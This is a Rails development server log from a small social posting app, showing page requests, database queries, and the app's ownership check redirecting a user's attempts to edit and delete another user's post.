  [1m[36mUser Load (0.2ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 1], ["LIMIT", 1]]
  ↳ app/views/friends/index.html.erb:16
  [1m[36mUser Load (0.2ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 6], ["LIMIT", 1]]
  ↳ app/views/friends/index.html.erb:16
  [1m[36mCACHE User Load (0.0ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 6], ["LIMIT", 1]]
  ↳ app/views/friends/index.html.erb:16
  [1m[36mCACHE User Load (0.0ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 6], ["LIMIT", 1]]
  ↳ app/views/friends/index.html.erb:16
  [1m[36mCACHE User Load (0.0ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 6], ["LIMIT", 1]]
  ↳ app/views/friends/index.html.erb:16
  [1m[36mCACHE User Load (0.0ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 6], ["LIMIT", 1]]
  ↳ app/views/friends/index.html.erb:16
  [1m[36mCACHE User Load (0.0ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 6], ["LIMIT", 1]]
  ↳ app/views/friends/index.html.erb:16
  [1m[36mCACHE User Load (0.0ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 6], ["LIMIT", 1]]
  ↳ app/views/friends/index.html.erb:16
  [1m[36mCACHE User Load (0.0ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 6], ["LIMIT", 1]]
  ↳ app/views/friends/index.html.erb:16
  [1m[36mCACHE User Load (0.0ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 6], ["LIMIT", 1]]
  ↳ app/views/friends/index.html.erb:16
  [1m[36mCACHE User Load (0.0ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 6], ["LIMIT", 1]]
  ↳ app/views/friends/index.html.erb:16
  [1m[36mCACHE User Load (0.0ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 6], ["LIMIT", 1]]
  ↳ app/views/friends/index.html.erb:16
  [1m[36mCACHE User Load (0.0ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 6], ["LIMIT", 1]]
  ↳ app/views/friends/index.html.erb:16
  [1m[36mCACHE User Load (0.0ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 6], ["LIMIT", 1]]
  ↳ app/views/friends/index.html.erb:16
  [1m[36mCACHE User Load (0.0ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 6], ["LIMIT", 1]]
  ↳ app/views/friends/index.html.erb:16
  [1m[36mCACHE User Load (0.0ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 6], ["LIMIT", 1]]
  ↳ app/views/friends/index.html.erb:16
  [1m[36mCACHE User Load (0.0ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 6], ["LIMIT", 1]]
  ↳ app/views/friends/index.html.erb:16
  [1m[36mCACHE User Load (0.0ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 6], ["LIMIT", 1]]
  ↳ app/views/friends/index.html.erb:16
  [1m[36mCACHE User Load (0.0ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 6], ["LIMIT", 1]]
  ↳ app/views/friends/index.html.erb:16
  [1m[36mCACHE User Load (0.0ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 6], ["LIMIT", 1]]
  ↳ app/views/friends/index.html.erb:16
  [1m[36mCACHE User Load (0.0ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 6], ["LIMIT", 1]]
  ↳ app/views/friends/index.html.erb:16
  [1m[36mCACHE User Load (0.0ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 6], ["LIMIT", 1]]
  ↳ app/views/friends/index.html.erb:16
  [1m[36mCACHE User Load (0.0ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 6], ["LIMIT", 1]]
  ↳ app/views/friends/index.html.erb:16
  [1m[36mCACHE User Load (0.0ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 6], ["LIMIT", 1]]
  ↳ app/views/friends/index.html.erb:16
  [1m[36mCACHE User Load (0.0ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 6], ["LIMIT", 1]]
  ↳ app/views/friends/index.html.erb:16
  Rendered friends/index.html.erb within layouts/application (Duration: 87.8ms | Allocations: 24864)
  [1m[36mAdmSetting Load (0.1ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms6" = ? LIMIT ?[0m  [["adms6", 1], ["LIMIT", 1]]
  ↳ app/views/layouts/application.html.erb:9
  [1m[36mAdmSetting Load (0.1ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms7" = ? LIMIT ?[0m  [["adms7", 1], ["LIMIT", 1]]
  ↳ app/views/layouts/application.html.erb:12
[Webpacker] Everything's up-to-date. Nothing to do
  Rendered home/_header.html.erb (Duration: 0.5ms | Allocations: 265)
  [1m[36mCACHE AdmSetting Load (0.0ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms6" = ? LIMIT ?[0m  [["adms6", 1], ["LIMIT", 1]]
  ↳ app/views/layouts/application.html.erb:40
  [1m[36mCACHE AdmSetting Load (0.0ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms7" = ? LIMIT ?[0m  [["adms7", 1], ["LIMIT", 1]]
  ↳ app/views/layouts/application.html.erb:43
  Rendered layout layouts/application.html.erb (Duration: 99.9ms | Allocations: 30476)
Completed 200 OK in 132ms (Views: 100.4ms | ActiveRecord: 4.6ms | Allocations: 35114)


Started GET "/settings/index" for 10.0.0.55 at 2021-05-28 21:07:02 -0600
Cannot render console from 10.0.0.55! Allowed networks: 127.0.0.0/127.255.255.255, ::1
Processing by SettingsController#index as HTML
  [1m[36mUser Load (0.4ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? ORDER BY "users"."id" ASC LIMIT ?[0m  [["id", 9], ["LIMIT", 1]]
  ↳ app/controllers/application_controller.rb:4:in `validate_login'
  [1m[36mDisabledAccount Load (0.3ms)[0m  [1m[34mSELECT "disabled_accounts".* FROM "disabled_accounts" WHERE "disabled_accounts"."email" = ? LIMIT ?[0m  [["email", "1529jag@vatlnetwork.net"], ["LIMIT", 1]]
  ↳ app/controllers/application_controller.rb:4:in `validate_login'
  [1m[36mAdmSetting Load (0.2ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms1" = ? LIMIT ?[0m  [["adms1", 0], ["LIMIT", 1]]
  ↳ app/controllers/application_controller.rb:10:in `validate_login'
  [1m[36mAdmin Load (0.2ms)[0m  [1m[34mSELECT "admins".* FROM "admins" WHERE "admins"."admin" = ? LIMIT ?[0m  [["admin", "1529jag@vatlnetwork.net"], ["LIMIT", 1]]
  ↳ app/controllers/application_controller.rb:21:in `validate_login'
  [1m[36mAdmSetting Load (0.4ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms3" = ? LIMIT ?[0m  [["adms3", 0], ["LIMIT", 1]]
  ↳ app/controllers/settings_controller.rb:3:in `index'
  Rendering layout layouts/application.html.erb
  Rendering settings/index.html.erb within layouts/application
  Rendered settings/index.html.erb within layouts/application (Duration: 1.2ms | Allocations: 141)
  [1m[36mAdmSetting Load (0.2ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms6" = ? LIMIT ?[0m  [["adms6", 1], ["LIMIT", 1]]
  ↳ app/views/layouts/application.html.erb:9
  [1m[36mAdmSetting Load (0.2ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms7" = ? LIMIT ?[0m  [["adms7", 1], ["LIMIT", 1]]
  ↳ app/views/layouts/application.html.erb:12
[Webpacker] Everything's up-to-date. Nothing to do
  Rendered home/_header.html.erb (Duration: 1.2ms | Allocations: 300)
  [1m[36mCACHE AdmSetting Load (0.0ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms6" = ? LIMIT ?[0m  [["adms6", 1], ["LIMIT", 1]]
  ↳ app/views/layouts/application.html.erb:40
  [1m[36mCACHE AdmSetting Load (0.0ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms7" = ? LIMIT ?[0m  [["adms7", 1], ["LIMIT", 1]]
  ↳ app/views/layouts/application.html.erb:43
  Rendered layout layouts/application.html.erb (Duration: 27.2ms | Allocations: 5942)
Completed 200 OK in 58ms (Views: 30.4ms | ActiveRecord: 2.0ms | Allocations: 10587)


Started GET "/home/about" for 10.0.0.55 at 2021-05-28 21:07:05 -0600
Cannot render console from 10.0.0.55! Allowed networks: 127.0.0.0/127.255.255.255, ::1
Processing by HomeController#about as HTML
  [1m[36mUser Load (0.4ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? ORDER BY "users"."id" ASC LIMIT ?[0m  [["id", 9], ["LIMIT", 1]]
  ↳ app/controllers/application_controller.rb:4:in `validate_login'
  [1m[36mDisabledAccount Load (0.3ms)[0m  [1m[34mSELECT "disabled_accounts".* FROM "disabled_accounts" WHERE "disabled_accounts"."email" = ? LIMIT ?[0m  [["email", "1529jag@vatlnetwork.net"], ["LIMIT", 1]]
  ↳ app/controllers/application_controller.rb:4:in `validate_login'
  [1m[36mAdmSetting Load (0.2ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms1" = ? LIMIT ?[0m  [["adms1", 0], ["LIMIT", 1]]
  ↳ app/controllers/application_controller.rb:10:in `validate_login'
  [1m[36mAdmin Load (0.3ms)[0m  [1m[34mSELECT "admins".* FROM "admins" WHERE "admins"."admin" = ? LIMIT ?[0m  [["admin", "1529jag@vatlnetwork.net"], ["LIMIT", 1]]
  ↳ app/controllers/home_controller.rb:12:in `about'
  Rendering layout layouts/application.html.erb
  Rendering home/about.html.erb within layouts/application
  [1m[36mAdmSetting Load (0.6ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms2" = ? LIMIT ?[0m  [["adms2", 0], ["LIMIT", 1]]
  ↳ app/views/home/about.html.erb:1
  Rendered home/about.html.erb within layouts/application (Duration: 8.4ms | Allocations: 944)
  [1m[36mAdmSetting Load (0.3ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms6" = ? LIMIT ?[0m  [["adms6", 1], ["LIMIT", 1]]
  ↳ app/views/layouts/application.html.erb:9
  [1m[36mAdmSetting Load (0.2ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms7" = ? LIMIT ?[0m  [["adms7", 1], ["LIMIT", 1]]
  ↳ app/views/layouts/application.html.erb:12
[Webpacker] Everything's up-to-date. Nothing to do
  Rendered home/_header.html.erb (Duration: 1.1ms | Allocations: 247)
  [1m[36mCACHE AdmSetting Load (0.0ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms6" = ? LIMIT ?[0m  [["adms6", 1], ["LIMIT", 1]]
  ↳ app/views/layouts/application.html.erb:40
  [1m[36mCACHE AdmSetting Load (0.0ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms7" = ? LIMIT ?[0m  [["adms7", 1], ["LIMIT", 1]]
  ↳ app/views/layouts/application.html.erb:43
  Rendered layout layouts/application.html.erb (Duration: 40.3ms | Allocations: 6383)
Completed 200 OK in 64ms (Views: 40.5ms | ActiveRecord: 2.3ms | Allocations: 9541)


Started GET "/home/index" for 10.0.0.55 at 2021-05-28 21:07:09 -0600
Cannot render console from 10.0.0.55! Allowed networks: 127.0.0.0/127.255.255.255, ::1
Processing by HomeController#index as HTML
  [1m[36mUser Load (0.3ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? ORDER BY "users"."id" ASC LIMIT ?[0m  [["id", 9], ["LIMIT", 1]]
  ↳ app/controllers/application_controller.rb:4:in `validate_login'
  [1m[36mDisabledAccount Load (0.3ms)[0m  [1m[34mSELECT "disabled_accounts".* FROM "disabled_accounts" WHERE "disabled_accounts"."email" = ? LIMIT ?[0m  [["email", "1529jag@vatlnetwork.net"], ["LIMIT", 1]]
  ↳ app/controllers/application_controller.rb:4:in `validate_login'
  [1m[36mAdmSetting Load (0.2ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms1" = ? LIMIT ?[0m  [["adms1", 0], ["LIMIT", 1]]
  ↳ app/controllers/application_controller.rb:10:in `validate_login'
  [1m[36mAdmin Load (0.3ms)[0m  [1m[34mSELECT "admins".* FROM "admins" WHERE "admins"."admin" = ? LIMIT ?[0m  [["admin", "1529jag@vatlnetwork.net"], ["LIMIT", 1]]
  ↳ app/controllers/home_controller.rb:4:in `index'
  Rendering layout layouts/application.html.erb
  Rendering home/index.html.erb within layouts/application
  Rendered home/index.html.erb within layouts/application (Duration: 0.2ms | Allocations: 38)
  [1m[36mAdmSetting Load (0.2ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms6" = ? LIMIT ?[0m  [["adms6", 1], ["LIMIT", 1]]
  ↳ app/views/layouts/application.html.erb:9
  [1m[36mAdmSetting Load (0.2ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms7" = ? LIMIT ?[0m  [["adms7", 1], ["LIMIT", 1]]
  ↳ app/views/layouts/application.html.erb:12
[Webpacker] Everything's up-to-date. Nothing to do
  Rendered home/_header.html.erb (Duration: 1.1ms | Allocations: 247)
  [1m[36mCACHE AdmSetting Load (0.0ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms6" = ? LIMIT ?[0m  [["adms6", 1], ["LIMIT", 1]]
  ↳ app/views/layouts/application.html.erb:40
  [1m[36mCACHE AdmSetting Load (0.0ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms7" = ? LIMIT ?[0m  [["adms7", 1], ["LIMIT", 1]]
  ↳ app/views/layouts/application.html.erb:43
  Rendered layout layouts/application.html.erb (Duration: 31.7ms | Allocations: 5476)
Completed 200 OK in 54ms (Views: 32.5ms | ActiveRecord: 1.7ms | Allocations: 8358)


Started GET "/posts" for 10.0.0.55 at 2021-05-28 21:07:10 -0600
Cannot render console from 10.0.0.55! Allowed networks: 127.0.0.0/127.255.255.255, ::1
Processing by PostsController#index as HTML
  [1m[36mUser Load (0.4ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? ORDER BY "users"."id" ASC LIMIT ?[0m  [["id", 9], ["LIMIT", 1]]
  ↳ app/controllers/application_controller.rb:4:in `validate_login'
  [1m[36mDisabledAccount Load (0.3ms)[0m  [1m[34mSELECT "disabled_accounts".* FROM "disabled_accounts" WHERE "disabled_accounts"."email" = ? LIMIT ?[0m  [["email", "1529jag@vatlnetwork.net"], ["LIMIT", 1]]
  ↳ app/controllers/application_controller.rb:4:in `validate_login'
  [1m[36mAdmSetting Load (0.3ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms1" = ? LIMIT ?[0m  [["adms1", 0], ["LIMIT", 1]]
  ↳ app/controllers/application_controller.rb:10:in `validate_login'
  [1m[36mAdmin Load (0.3ms)[0m  [1m[34mSELECT "admins".* FROM "admins" WHERE "admins"."admin" = ? LIMIT ?[0m  [["admin", "1529jag@vatlnetwork.net"], ["LIMIT", 1]]
  ↳ app/controllers/application_controller.rb:21:in `validate_login'
  [1m[36mAdmSetting Load (0.3ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms5" = ? LIMIT ?[0m  [["adms5", 0], ["LIMIT", 1]]
  ↳ app/controllers/posts_controller.rb:7:in `check_status'
  Rendering layout layouts/application.html.erb
  Rendering posts/index.html.erb within layouts/application
  [1m[36mPost Load (0.3ms)[0m  [1m[34mSELECT "posts".* FROM "posts"[0m
  ↳ app/views/posts/index.html.erb:5
  [1m[36mUser Load (0.3ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 8], ["LIMIT", 1]]
  ↳ app/views/posts/index.html.erb:6
  [1m[36mUser Load (0.3ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 6], ["LIMIT", 1]]
  ↳ app/views/posts/index.html.erb:6
  Rendered posts/index.html.erb within layouts/application (Duration: 19.7ms | Allocations: 2472)
  [1m[36mAdmSetting Load (0.2ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms6" = ? LIMIT ?[0m  [["adms6", 1], ["LIMIT", 1]]
  ↳ app/views/layouts/application.html.erb:9
  [1m[36mAdmSetting Load (0.2ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms7" = ? LIMIT ?[0m  [["adms7", 1], ["LIMIT", 1]]
  ↳ app/views/layouts/application.html.erb:12
[Webpacker] Everything's up-to-date. Nothing to do
  Rendered home/_header.html.erb (Duration: 0.9ms | Allocations: 233)
  [1m[36mCACHE AdmSetting Load (0.0ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms6" = ? LIMIT ?[0m  [["adms6", 1], ["LIMIT", 1]]
  ↳ app/views/layouts/application.html.erb:40
  [1m[36mCACHE AdmSetting Load (0.0ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms7" = ? LIMIT ?[0m  [["adms7", 1], ["LIMIT", 1]]
  ↳ app/views/layouts/application.html.erb:43
  Rendered layout layouts/application.html.erb (Duration: 46.2ms | Allocations: 7899)
Completed 200 OK in 80ms (Views: 46.8ms | ActiveRecord: 2.8ms | Allocations: 11943)


Started GET "/posts/24/edit" for 10.0.0.55 at 2021-05-28 21:07:26 -0600
Cannot render console from 10.0.0.55! Allowed networks: 127.0.0.0/127.255.255.255, ::1
Processing by PostsController#edit as HTML
  Parameters: {"id"=>"24"}
  [1m[36mUser Load (0.1ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? ORDER BY "users"."id" ASC LIMIT ?[0m  [["id", 9], ["LIMIT", 1]]
  ↳ app/controllers/application_controller.rb:4:in `validate_login'
  [1m[36mDisabledAccount Load (0.1ms)[0m  [1m[34mSELECT "disabled_accounts".* FROM "disabled_accounts" WHERE "disabled_accounts"."email" = ? LIMIT ?[0m  [["email", "1529jag@vatlnetwork.net"], ["LIMIT", 1]]
  ↳ app/controllers/application_controller.rb:4:in `validate_login'
  [1m[36mAdmSetting Load (0.3ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms1" = ? LIMIT ?[0m  [["adms1", 0], ["LIMIT", 1]]
  ↳ app/controllers/application_controller.rb:10:in `validate_login'
  [1m[36mAdmin Load (0.3ms)[0m  [1m[34mSELECT "admins".* FROM "admins" WHERE "admins"."admin" = ? LIMIT ?[0m  [["admin", "1529jag@vatlnetwork.net"], ["LIMIT", 1]]
  ↳ app/controllers/application_controller.rb:21:in `validate_login'
  [1m[36mPost Load (0.5ms)[0m  [1m[34mSELECT "posts".* FROM "posts" WHERE "posts"."id" = ? LIMIT ?[0m  [["id", 24], ["LIMIT", 1]]
  ↳ app/controllers/posts_controller.rb:79:in `set_post'
  [1m[36mPost Load (0.4ms)[0m  [1m[34mSELECT "posts".* FROM "posts" WHERE "posts"."user_id" = ? AND "posts"."id" = ? LIMIT ?[0m  [["user_id", 9], ["id", 24], ["LIMIT", 1]]
  ↳ app/controllers/posts_controller.rb:72:in `correct_user'
Redirected to http://10.0.0.161:3000/posts
Filter chain halted as :correct_user rendered or redirected
Completed 302 Found in 34ms (ActiveRecord: 1.6ms | Allocations: 5920)


Started GET "/posts" for 10.0.0.55 at 2021-05-28 21:07:26 -0600
Cannot render console from 10.0.0.55! Allowed networks: 127.0.0.0/127.255.255.255, ::1
Processing by PostsController#index as HTML
  [1m[36mUser Load (0.3ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? ORDER BY "users"."id" ASC LIMIT ?[0m  [["id", 9], ["LIMIT", 1]]
  ↳ app/controllers/application_controller.rb:4:in `validate_login'
  [1m[36mDisabledAccount Load (0.2ms)[0m  [1m[34mSELECT "disabled_accounts".* FROM "disabled_accounts" WHERE "disabled_accounts"."email" = ? LIMIT ?[0m  [["email", "1529jag@vatlnetwork.net"], ["LIMIT", 1]]
  ↳ app/controllers/application_controller.rb:4:in `validate_login'
  [1m[36mAdmSetting Load (0.2ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms1" = ? LIMIT ?[0m  [["adms1", 0], ["LIMIT", 1]]
  ↳ app/controllers/application_controller.rb:10:in `validate_login'
  [1m[36mAdmin Load (0.2ms)[0m  [1m[34mSELECT "admins".* FROM "admins" WHERE "admins"."admin" = ? LIMIT ?[0m  [["admin", "1529jag@vatlnetwork.net"], ["LIMIT", 1]]
  ↳ app/controllers/application_controller.rb:21:in `validate_login'
  [1m[36mAdmSetting Load (0.2ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms5" = ? LIMIT ?[0m  [["adms5", 0], ["LIMIT", 1]]
  ↳ app/controllers/posts_controller.rb:7:in `check_status'
  Rendering layout layouts/application.html.erb
  Rendering posts/index.html.erb within layouts/application
  [1m[36mPost Load (0.2ms)[0m  [1m[34mSELECT "posts".* FROM "posts"[0m
  ↳ app/views/posts/index.html.erb:5
  [1m[36mUser Load (0.2ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 8], ["LIMIT", 1]]
  ↳ app/views/posts/index.html.erb:6
  [1m[36mUser Load (0.2ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 6], ["LIMIT", 1]]
  ↳ app/views/posts/index.html.erb:6
  Rendered posts/index.html.erb within layouts/application (Duration: 11.9ms | Allocations: 2468)
  [1m[36mAdmSetting Load (0.1ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms6" = ? LIMIT ?[0m  [["adms6", 1], ["LIMIT", 1]]
  ↳ app/views/layouts/application.html.erb:9
  [1m[36mAdmSetting Load (0.1ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms7" = ? LIMIT ?[0m  [["adms7", 1], ["LIMIT", 1]]
  ↳ app/views/layouts/application.html.erb:12
[Webpacker] Everything's up-to-date. Nothing to do
  Rendered home/_header.html.erb (Duration: 0.7ms | Allocations: 234)
  Rendered layouts/_alerts.html.erb (Duration: 0.1ms | Allocations: 45)
  [1m[36mCACHE AdmSetting Load (0.0ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms6" = ? LIMIT ?[0m  [["adms6", 1], ["LIMIT", 1]]
  ↳ app/views/layouts/application.html.erb:40
  [1m[36mCACHE AdmSetting Load (0.0ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms7" = ? LIMIT ?[0m  [["adms7", 1], ["LIMIT", 1]]
  ↳ app/views/layouts/application.html.erb:43
  Rendered layout layouts/application.html.erb (Duration: 31.0ms | Allocations: 8138)
Completed 200 OK in 52ms (Views: 31.2ms | ActiveRecord: 1.9ms | Allocations: 11749)


Started DELETE "/posts/24" for 10.0.0.55 at 2021-05-28 21:07:31 -0600
Cannot render console from 10.0.0.55! Allowed networks: 127.0.0.0/127.255.255.255, ::1
Processing by PostsController#destroy as HTML
  Parameters: {"authenticity_token"=>"[FILTERED]", "id"=>"24"}
  [1m[36mUser Load (0.2ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? ORDER BY "users"."id" ASC LIMIT ?[0m  [["id", 9], ["LIMIT", 1]]
  ↳ app/controllers/application_controller.rb:4:in `validate_login'
  [1m[36mDisabledAccount Load (0.2ms)[0m  [1m[34mSELECT "disabled_accounts".* FROM "disabled_accounts" WHERE "disabled_accounts"."email" = ? LIMIT ?[0m  [["email", "1529jag@vatlnetwork.net"], ["LIMIT", 1]]
  ↳ app/controllers/application_controller.rb:4:in `validate_login'
  [1m[36mAdmSetting Load (0.2ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms1" = ? LIMIT ?[0m  [["adms1", 0], ["LIMIT", 1]]
  ↳ app/controllers/application_controller.rb:10:in `validate_login'
  [1m[36mAdmin Load (0.2ms)[0m  [1m[34mSELECT "admins".* FROM "admins" WHERE "admins"."admin" = ? LIMIT ?[0m  [["admin", "1529jag@vatlnetwork.net"], ["LIMIT", 1]]
  ↳ app/controllers/application_controller.rb:21:in `validate_login'
  [1m[36mPost Load (0.2ms)[0m  [1m[34mSELECT "posts".* FROM "posts" WHERE "posts"."id" = ? LIMIT ?[0m  [["id", 24], ["LIMIT", 1]]
  ↳ app/controllers/posts_controller.rb:79:in `set_post'
  [1m[36mPost Load (0.2ms)[0m  [1m[34mSELECT "posts".* FROM "posts" WHERE "posts"."user_id" = ? AND "posts"."id" = ? LIMIT ?[0m  [["user_id", 9], ["id", 24], ["LIMIT", 1]]
  ↳ app/controllers/posts_controller.rb:72:in `correct_user'
Redirected to http://10.0.0.161:3000/posts
Filter chain halted as :correct_user rendered or redirected
Completed 302 Found in 21ms (ActiveRecord: 1.0ms | Allocations: 4140)


Started GET "/posts" for 10.0.0.55 at 2021-05-28 21:07:31 -0600
Cannot render console from 10.0.0.55! Allowed networks: 127.0.0.0/127.255.255.255, ::1
Processing by PostsController#index as HTML
  [1m[36mUser Load (0.3ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? ORDER BY "users"."id" ASC LIMIT ?[0m  [["id", 9], ["LIMIT", 1]]
  ↳ app/controllers/application_controller.rb:4:in `validate_login'
  [1m[36mDisabledAccount Load (0.2ms)[0m  [1m[34mSELECT "disabled_accounts".* FROM "disabled_accounts" WHERE "disabled_accounts"."email" = ? LIMIT ?[0m  [["email", "1529jag@vatlnetwork.net"], ["LIMIT", 1]]
  ↳ app/controllers/application_controller.rb:4:in `validate_login'
  [1m[36mAdmSetting Load (0.2ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms1" = ? LIMIT ?[0m  [["adms1", 0], ["LIMIT", 1]]
  ↳ app/controllers/application_controller.rb:10:in `validate_login'
  [1m[36mAdmin Load (0.2ms)[0m  [1m[34mSELECT "admins".* FROM "admins" WHERE "admins"."admin" = ? LIMIT ?[0m  [["admin", "1529jag@vatlnetwork.net"], ["LIMIT", 1]]
  ↳ app/controllers/application_controller.rb:21:in `validate_login'
  [1m[36mAdmSetting Load (0.2ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms5" = ? LIMIT ?[0m  [["adms5", 0], ["LIMIT", 1]]
  ↳ app/controllers/posts_controller.rb:7:in `check_status'
  Rendering layout layouts/application.html.erb
  Rendering posts/index.html.erb within layouts/application
  [1m[36mPost Load (0.2ms)[0m  [1m[34mSELECT "posts".* FROM "posts"[0m
  ↳ app/views/posts/index.html.erb:5
  [1m[36mUser Load (0.2ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 8], ["LIMIT", 1]]
  ↳ app/views/posts/index.html.erb:6
  [1m[36mUser Load (0.2ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 6], ["LIMIT", 1]]
  ↳ app/views/posts/index.html.erb:6
  Rendered posts/index.html.erb within layouts/application (Duration: 12.0ms | Allocations: 2440)
  [1m[36mAdmSetting Load (0.1ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms6" = ? LIMIT ?[0m  [["adms6", 1], ["LIMIT", 1]]
  ↳ app/views/layouts/application.html.erb:9
  [1m[36mAdmSetting Load (0.1ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms7" = ? LIMIT ?[0m  [["adms7", 1], ["LIMIT", 1]]
